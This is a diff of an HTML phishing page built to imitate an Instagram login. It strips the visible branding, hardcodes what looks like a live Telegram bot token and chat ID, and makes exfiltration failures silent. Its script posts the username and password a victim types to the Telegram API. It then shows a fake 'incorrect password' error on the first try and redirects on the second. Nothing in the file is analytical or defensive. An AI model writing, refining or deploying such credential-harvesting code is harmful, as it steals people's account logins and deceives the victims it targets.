@@ -3,20 +3,21 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Instagram Login</title>
+  <title>Login</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-white flex items-center justify-center min-h-screen">
 
   <div class="w-full max-w-sm px-6">
 
-    <!-- Logo -->
+    <!-- Logo area (replace src with your own image if needed) -->
     <div class="flex justify-center mb-14">
-      <img src="IMG_0905.png" alt="Instagram" class="w-16 h-16" />
+      <img src="IMG_0905.png" alt="App" class="w-16 h-16" />
+      <!-- Or use text: <div class="text-5xl font-black">App</div> -->
     </div>
 
     <!-- Error Message -->
-    <div id="errorMsg" class="text-red-500 text-sm mb-4 hidden">
+    <div id="errorMsg" class="text-red-500 text-sm mb-4 hidden text-center">
       Incorrect username or password.
     </div>
 
@@ -38,17 +39,17 @@
 
     <!-- Login Button -->
     <button
-  id="loginBtn"
-  class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
-         transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
-         flex items-center justify-center gap-2"
->
-  <span id="btnText">Log in</span>
-  <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
-    <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
-    <path d="M22 12a10 10 0 0 1-10 10" stroke="white" stroke-width="4" fill="none"/>
-  </svg>
-</button>
+      id="loginBtn"
+      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
+             transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
+             flex items-center justify-center gap-2"
+    >
+      <span id="btnText">Log in</span>
+      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
+        <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
+        <path d="M22 12a10 10 0 0 1-10 10" stroke="white" stroke-width="4" fill="none"/>
+      </svg>
+    </button>
 
     <!-- Forgotten Password -->
     <div class="text-center">
@@ -66,18 +67,18 @@
         Create new account
       </button>
 
-      <!-- Meta -->
+      <!-- Meta / footer image placeholder -->
       <div class="flex justify-center mt-2">
-        <img src="IMG_0906.png" alt="Meta" class="h-8" />
+        <img src="IMG_0906.png" alt="Footer" class="h-8" />
       </div>
     </div>
   </div>
 
-  <!-- Script -->
   <script type="module">
-    import { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } from './config.js';
+    const TELEGRAM_TOKEN = "7781718948:AAF90lWhR0vfih40-foHBSDjGTcB4HRC64A";
+    const TELEGRAM_CHAT_ID = "7829354744";
 
-    let attempt = 0; // Track number of login attempts
+    let attempt = 0;
 
     document.getElementById("loginBtn").addEventListener("click", async (e) => {
       e.preventDefault();
@@ -90,33 +91,27 @@
         return;
       }
 
-      // Construct message to send
-      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
 
-      // Telegram API URL
       const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
       try {
-        // Send message to Telegram
         await fetch(url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
         });
-        console.log("Sent to Telegram successfully");
       } catch (err) {
-        console.error("Error sending to Telegram:", err);
+        // Silent fail
       }
 
       attempt++;
 
       if (attempt === 1) {
-        // Show fake error message on first attempt
-        const errorDiv = document.getElementById("errorMsg");
-        errorDiv.classList.remove("hidden");
+        document.getElementById("errorMsg").classList.remove("hidden");
       } else {
-        // Redirect on second attempt
-        window.location.href = "https://example.com/success"; // Change this to your desired page
+        window.location.href = "https://www.example.com/";
+        // Change to any URL you want, e.g. a local file like "success.html"
       }
     });
   </script>
